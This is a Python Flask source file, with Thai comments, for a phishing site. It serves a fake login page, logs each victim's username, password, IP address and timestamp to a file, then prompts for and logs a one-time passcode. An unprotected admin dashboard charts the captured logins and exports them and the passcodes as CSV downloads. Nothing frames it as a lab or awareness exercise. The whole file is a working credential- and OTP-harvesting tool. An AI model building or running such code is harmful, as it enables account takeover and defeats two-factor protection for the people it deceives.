from flask import Flask, request, render_template, Response
from datetime import datetime
import os, io, csv
from collections import Counter
import json

app = Flask(__name__)

LOG_DIR  = "logs"
CRED_LOG = os.path.join(LOG_DIR, "captured.txt")
OTP_LOG  = os.path.join(LOG_DIR, "otp.txt")

# ─── หน้า login ───────────────────────────
@app.route("/")
def login():
    return render_template("login.html")

# ─── รับ login → บันทึก → โยนไป OTP ────────
@app.route("/submit", methods=["POST"])
def submit():
    username = request.form["username"]
    password = request.form["password"]
    os.makedirs(LOG_DIR, exist_ok=True)
    with open(CRED_LOG, "a") as f:
        f.write(f"{datetime.now()} | {request.remote_addr} | {username} | {password}\n")
    return render_template("otp.html", username=username)

# ─── รับ OTP → บันทึก → โยนไป alert ───────
@app.route("/verify-otp", methods=["POST"])
def verify_otp():
    otp = request.form["otp"]
    os.makedirs(LOG_DIR, exist_ok=True)
    with open(OTP_LOG, "a") as f:
        f.write(f"{datetime.now()} | {request.remote_addr} | OTP: {otp}\n")
    return render_template("alert.html")

# ─── Admin Dashboard + Chart Data + Export ───
@app.route("/admin")
def admin():
    os.makedirs(LOG_DIR, exist_ok=True)
    creds = open(CRED_LOG).read().splitlines() if os.path.exists(CRED_LOG) else []
    otps  = open(OTP_LOG).read().splitlines()  if os.path.exists(OTP_LOG)  else []

    total_credentials = len(creds)
    total_otps        = len(otps)
    # ถ้าต้องการให้ Total Attempts = sum ทั้งสอง
    total_attempts    = total_credentials + total_otps

    # เตรียม data สำหรับกราฟ (นับ per วัน)
    cred_counter = Counter(line.split("|")[0].strip().split(" ")[0] for line in creds)
    otp_counter  = Counter(line.split("|")[0].strip().split(" ")[0] for line in otps)

    cred_dates  = sorted(cred_counter)
    cred_counts = [cred_counter[d] for d in cred_dates]
    otp_dates   = sorted(otp_counter)
    otp_counts  = [otp_counter[d] for d in otp_dates]

    # turn into JSON strings
    cred_dates_json  = json.dumps(cred_dates)
    cred_counts_json = json.dumps(cred_counts)
    otp_dates_json   = json.dumps(otp_dates)
    otp_counts_json  = json.dumps(otp_counts)

    return render_template("admin.html",
        creds=creds, otps=otps,
        cred_dates_json=cred_dates_json,
        cred_counts_json=cred_counts_json,
        otp_dates_json=otp_dates_json,
        otp_counts_json=otp_counts_json,total_attempts=total_attempts,total_credentials=total_credentials,total_otps=total_otps
    )

# ─── Export Credentials CSV ──────────────────
@app.route("/download/credentials")
def download_credentials():
    if not os.path.exists(CRED_LOG):
        return "No credentials to download.", 404
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["timestamp","ip","username","password"])
    for line in open(CRED_LOG):
        parts = [p.strip() for p in line.split("|")]
        writer.writerow(parts)
    resp = Response(output.getvalue(), mimetype="text/csv")
    resp.headers["Content-Disposition"] = "attachment; filename=credentials.csv"
    return resp

# ─── Export OTP CSV ─────────────────────────
@app.route("/download/otps")
def download_otps():
    if not os.path.exists(OTP_LOG):
        return "No OTP entries to download.", 404
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["timestamp","ip","otp"])
    for line in open(OTP_LOG):
        parts = [p.strip() for p in line.split("|")]
        # ผลัด list เป็น [timestamp, ip, 'OTP: xxx']
        writer.writerow(parts)
    resp = Response(output.getvalue(), mimetype="text/csv")
    resp.headers["Content-Disposition"] = "attachment; filename=otps.csv"
    return resp

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=8000)
